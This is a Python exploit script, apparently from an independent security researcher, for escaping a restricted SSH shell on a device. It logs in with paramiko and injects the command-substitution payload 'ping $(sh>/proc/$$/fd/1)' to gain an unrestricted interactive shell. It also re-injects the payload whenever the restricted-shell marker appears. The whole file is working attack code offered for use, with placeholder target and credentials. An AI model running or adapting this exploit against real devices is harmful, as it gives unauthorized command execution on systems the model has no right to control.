__author__ = "Santhosh Baswa"
__copyright__ = "Copyright 2016, Independent Security Research"
__program__ = "Escape Shell (RCE using <ping command> --> Shell)"
__payload__ = "ping $(sh>/proc/$$/fd/1)"

import socket
import sys
import paramiko
import threading

lock = threading.RLock()
payload = "ping $(sh>/proc/$$/fd/1) ?"
session = None
transport = None
stopbinding = False

def write(value):
    with lock:
        sys.stdout.write(value)
        sys.stdout.flush()

def channel_intercept():
    try:
        global stopbinding
        while True:
            if stopbinding:
                break
            data = session.recv(256)
            if not data:
                stopbinding = True
                transport.close()
                write("Press enter to exit...")
                break
            if "prctl_runCommandInShellWithTimeout" in data:
                transport.close()
                init()
                session.send("%s\n" % payload)
                channel_intercept()
            else:
                write(data)
    except KeyboardInterrupt:
        stopbinding = True
        transport.close()

def bind_stdin():
    try:
        global stopbinding
        while True:
            d = sys.stdin.read(1)
            if not d or stopbinding:
                break
            session.send(d)
    except KeyboardInterrupt:
        stopbinding = True
        transport.close()

def init():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("192.168.1.1", 22)) # Any IP Address  --> Login through SSH 
        global transport
        transport = paramiko.Transport(sock)
        try:
            transport.start_client()
        except paramiko.SSHException:
            write("SSH negotiation failed.")
            sys.exit(1)

        if not transport.is_authenticated():
            transport.auth_password("username", "password") # Give proper creds to SSH Connection
        if not transport.is_authenticated():
            write("Authentication failed.")
            transport.close()
            sys.exit(1)

        global session
        session = transport.open_session()
        session.get_pty()
        session.invoke_shell()

init()
writer = threading.Thread(target=channel_intercept)
writer.start()
session.send("%s\n" % payload)                        # Execute the particular payload in remote server 
bind_stdin()
